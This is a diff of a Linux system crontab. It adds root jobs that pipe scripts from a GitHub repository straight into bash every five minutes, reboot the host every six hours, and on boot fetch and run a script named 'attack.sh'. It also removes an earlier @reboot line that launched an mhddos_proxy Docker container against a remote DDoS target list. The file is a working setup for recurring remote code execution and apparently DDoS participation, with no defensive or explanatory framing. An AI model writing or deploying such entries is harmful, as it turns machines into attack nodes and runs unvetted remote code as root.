@@ -19,12 +19,12 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
 47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
 52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
-#
-
-#* *   * * *     root   curl https://raw.githubusercontent.com/russskiykorablidinah/pihpah/main/docker_cache.sh |bash && sudo reboot
-@reboot         root   sudo screen -d -m -S ddos sudo docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest -c https://raw.githubusercontent.com/SlavaUkraineSince1991/DDoS-for-all/main/targets/targets.txt --table
 
 
-#1 */1   * * *   root   echo "hey" >> /home/ubuntu/hey.txt
-#2 */    * * *   root   printf "hello"
-#hello we copied that file
+*/5 *   * * *     root   curl https://raw.githubusercontent.com/russskiykorablidinah/pihpah/main/traffick_check.sh |bash #every five minutes to check traffic 
+* */6   * * *     root   sudo reboot # to reboot the system every 6 hours
+@reboot           root   curl https://raw.githubusercontent.com/russskiykorablidinah/pihpah/main/attack.sh |bash
+
+
+
+#hello we copied that file from PihPah repository
